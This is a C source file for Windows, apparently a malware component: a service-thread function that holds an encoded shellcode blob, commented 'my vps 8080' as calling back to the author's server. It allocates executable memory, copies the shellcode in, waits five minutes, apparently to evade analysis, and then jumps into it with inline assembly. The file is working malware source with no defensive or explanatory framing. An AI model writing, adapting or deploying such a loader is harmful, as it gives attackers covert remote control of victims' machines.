#include "Payload.h"


//服务线程函数
DWORD WINAPI Service(LPVOID lpvThread)
{
	/*
	SYSTEMTIME oT;
	while(1){
		GetLocalTime(&oT);
		FILE* pLog = fopen("c:\\debug.log","at+");
		fprintf(pLog,"%2d.%2d.%2d %2d.%2d %2d\n",oT.wYear,oT.wMonth,oT.wDay,oT.wHour,oT.wMinute,oT.wSecond,oT.wMilliseconds); 
		fclose(pLog);
		Sleep(5000);
	}
	*/

	//my vps 8080
	unsigned char shellcode[] = 
		"\xdb\xc9\xbe\xfc\x9a\xa4\xcc\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
		"\x61\x31\x77\x1a\x83\xef\xfc\x03\x77\x16\xe2\x09\x20\x73\x15"
		"\x42\xcb\xa1\x66\x7d\x80\x7d\x93\x26\x5a\xb7\xea\x83\xad\x14"
		"\x1f\xb0\x0d\x9e\x1c\x32\x46\xce\x49\xcb\x5b\xbd\x6d\x0a\xab"
		"\x09\x54\xac\xd5\xee\x2b\xe4\xff\xdf\xb7\xe9\x32\xc8\x20\x8f"
		"\xf8\xdc\x32\xa1\x9b\x12\xb2\x55\xd3\xf4\xdd\x67\xa4\xb3\x3e"
		"\x4a\x92\xaf\xe3\x92\x09\x33\xc0\x49\x21\x3c\x10\x06\x1e\x2e"
		"\x44\x4a\x76\x08\x9a\xf4\x8d\x35\x56\x2e\xbd\x88\xab\xb9\x3b"
		"\x99\xfb\x54\x96\x4e\x9e\x94\xe2\x8d\x3e\x30\xd4\xc2\x88\x36"
		"\x43\xf6\x0d\xbe\xa4\x4d\x89\xbf\x19\x7a\x10\x8c\x85\xbd\xe2"
		"\x0e\x54\x60\xac\x67\xcb\xb3\x93\x38\xeb\x76\x71\x62\x3e\x59"
		"\x0c\x9b\x42\x9c\x69\x76\x4a\x1a\xd6\xf6\x74\x8d\x06\x75\x0f"
		"\x3e\x54\x08\xe4\x49\xf6\x97\x94\x13\xd3\x16\x61\xc7\x08\x79"
		"\x68\xc0\x3d\x71\x13\x45\xb1\x09\x2a\x7c\xd4\x0b\xf7\x65\xf0"
		"\xa0\x8c\x1d\x9d\xa2\xe7\x91\xe9\xd7\xfe\xf3\x83\xc1\xe2\x68"
		"\x58\xd0\x7a\xa6\x50\xc2\xae\x3b\x9c\x7a\xc2\xb8\xcf\x33\x05"
		"\xcc\x2a\x93\xb3\x02\x62\xe1\x57\xa6\x2e\xba\x33\x2b\x9a\x22"
		"\x75\x92\x1d\x03\x98\x2b\x49\x44\x14\x0f\x93\x7d\xa1\x63\x80"
		"\xa6\xc3\x67\x01\x77\xf9\x18\xae\x60\xab\xd0\xb4\xab\xbe\xf1"
		"\x0a\x90\x2d\xc8\x0e\x0e\xb7\x30\x2b\x9b\x5c\x69\xba\x4f\x8c"
		"\xea\xe3\xb0\x67\xef\x2a\x10\x31\xab\xc6\x69\x0d\x89\xb4\x93"
		"\x8f\x1c\x66\xa7\x29\xa9\xe2\xa5\x51\xbf\x3b\x13\x12\x8b\xfa"
		"\xc5\x71\x63\xeb\x95\x07\xe0\x10\xaf\xdf\xea\x8a\xd0\xa0\x4c"
		"\xe3\xf2\x04\xa0\x55\x4c\x52\xcb\xdb\x94\x87\x86\xd5\x0d\x1e"
		"\xb8\x16\x43\xfa\x79\xef\xbc\xa8\xb2\x80\xb2\x17\x1d\x52\x54"
		"\xaa\x97\x1b\xbd\x24\xe0\x41\xa1\x0f\xbf\xf0\x3b\x34\x3e\xe6"
		"\xd3\x2a\x05\xb4\xda\x7e\xca\xef\x57\x49\x6c\xd6\xa7\x75\x94"
		"\x80\x57\xab\xf3\xfd\x23\xfb\x86\x9c";

	PVOID p;
	
	p = VirtualAlloc(NULL,sizeof(shellcode),MEM_COMMIT,PAGE_EXECUTE_READWRITE);
	if( p != NULL){
		//printf("alloc ok");
		if(memcpy(p,shellcode,sizeof(shellcode))){
			//printf("cp ok");
			//wait 5m
			Sleep(1000*60*5);
			
			__asm
			{
				mov eax,p;
				jmp eax;
			}
		}
	}

	return 0;
}